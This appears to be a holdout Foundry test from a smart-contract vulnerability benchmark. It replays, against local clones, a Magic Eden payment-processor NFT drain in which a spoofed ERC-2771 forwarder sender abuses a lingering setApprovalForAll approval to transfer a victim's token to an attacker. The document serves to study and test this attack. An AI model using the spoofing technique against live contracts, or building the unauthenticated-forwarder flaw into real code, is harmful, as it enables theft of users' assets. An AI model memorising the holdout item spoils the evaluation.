// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MeMiniERC721, PaymentProcessorClone, SpoofForwarder} from
    "../fixtures/set-approval-for-all/b-incident/PaymentProcessorClone.sol";

/// @title set-approval-for-all (b) real-incident HOLDOUT: Magic Eden / Limit Break Payment Processor V2 drain.
/// @notice Minimized OFFLINE replay (no live RPC) of the 2026-09-24 Payment Processor V2 drain
///         (~$2.8M; WETH + NFTs across Ethereum/Polygon/Base/...). Wallets kept a standing
///         `setApprovalForAll(processor, true)` from listing on Magic Eden in 2024. The processor's
///         ERC-2771 meta-tx path trusted a forwarder-appended sender without authenticating it, so
///         the attacker spoofed a victim as the party who "agreed" to a zero-price trade; the
///         processor then pulled the victim's NFT with the victim's lingering operator approval and
///         delivered it to the attacker. The verdict is derived from the real outcome (the victim's
///         NFT ends up at the attacker), not hardcoded. HOLDOUT (label=vuln). Facts: PROVENANCE.md.
contract MagicEdenPaymentProcessorIncidentTest is Test {
    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[set-approval-for-all] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_paymentProcessorForwarderSpoofDrain_isDrained() public {
        SpoofForwarder forwarder = new SpoofForwarder();
        PaymentProcessorClone processor = new PaymentProcessorClone(address(forwarder));
        MeMiniERC721 collection = new MeMiniERC721(); // e.g. Meebits/Otherdeeds-class collection

        // Victim holds an NFT and left a blanket operator approval to the processor standing from a
        // 2024 Magic Eden listing (real example victim: 0xddf2163205e63c5b17c81647be1b73f918535d38).
        address victim = makeAddr("victim");
        uint256 victimTokenId = 10231; // one of the real drained token ids in the pinned tx
        collection.mint(victim, victimTokenId);
        vm.prank(victim);
        collection.setApprovalForAll(address(processor), true);

        address attacker = makeAddr("attacker"); // real: 0x0e9e147af2108e5354efb28740cade8e7422d1c7
        assertEq(collection.ownerOf(victimTokenId), victim, "precondition: victim owns the NFT");

        // Attacker routes through the trusted forwarder, spoofing the victim as the consenting seller.
        vm.prank(attacker);
        forwarder.relayAcceptOffer(processor, collection, victimTokenId, attacker, victim);

        bool drained = collection.ownerOf(victimTokenId) == attacker;
        _report("magic-eden-pp2-victim", drained);

        assertTrue(drained, "forwarder sender-spoof + lingering setApprovalForAll should drain the NFT");
    }
}
